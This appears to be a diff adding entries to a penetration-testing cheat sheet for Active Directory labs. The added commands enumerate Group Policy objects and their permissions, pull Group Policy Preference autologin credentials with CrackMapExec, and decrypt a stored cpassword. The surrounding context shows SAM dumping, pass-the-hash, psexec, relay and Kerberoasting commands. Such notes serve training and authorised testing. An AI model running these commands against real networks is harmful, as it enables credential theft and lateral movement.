@@ -157,6 +157,7 @@ PS C:\> Import-Module .\PowerView.ps1
 PS C:\> Export-PowerViewCSV
 PS C:\> ConvertTo-SID
 PS C:\> Convert-NameToSid <username>
+PS C:\> $sid=Convert-NameToSid "Domain Users"
 PS C:\> Get-DomainPolicy
 PS C:\> Get-DomainSPNTicket
 PS C:\> Get-Domain
@@ -202,7 +203,9 @@ PS C:\> Set-DomainObject -Credential $Cred2 -Identity <username> -SET @{servicep
 PS C:\> Set-DomainObject -Credential $Cred2 -Identity <username> -Clear serviceprincipalname -Verbose
 PS C:\> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members '<username>' -Credential $Cred2 -Verbose
 PS C:\> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
-PS C:\> Get-NetLocalGroupMember -ComputerName <computer> -GroupName "Remote Desktop Users"
+PS C:\> Get-NetLocalGroupMember -ComputerName <computer> -GroupName "Remote Desktop Users"\
+PS C:\> Get-DomainGPO | select displayname
+PS C:\> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid
 ```
 
 - Active Directory Module
@@ -220,6 +223,8 @@ PS C:\> Get-ADGroupMember -Identity "Backup Operators"
 PS C:\> $guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
 PS C:\> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
 PS C:\> ConvertFrom-SddlString
+PS C:\> Get-GPO -All | Select DisplayName
+PS C:\> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 ```
 
 - BloodHound
@@ -440,6 +445,8 @@ $ crackmapexec smb <IP address> -u <username> -p '<password>' -M spider_plus --s
 $ crackmapexec smb <IP address> -u <username> -p '<password>' --sam
 $ crackmapexec smb <IP address> -u <username> -p '<password>' --pass-pol
 $ crackmapexec smb <IP address> -u <username> -H <hash>
+$ crackmapexec smb -L | grep gpp
+$ crackmapexec smb <IP address> -u <username> -p <password> -M gpp_autologin
 $ impacket-psexec <username>:'<password>'@<IP address>
 $ psexec.py <domain>/<username>:'<password>'@<IP address>
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>        # Ensure SMB = Off in /etc/responder/Responder.conf, and 
@@ -2086,6 +2093,12 @@ $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username
 $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username> -request
 $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username> -request-user <username>
 $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username> -request-user <username> -outputfile <filename>
+```
+
+- GPPDecrypt
+
+```
+C:\> gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
 ```
 
 #8. - File Transfers
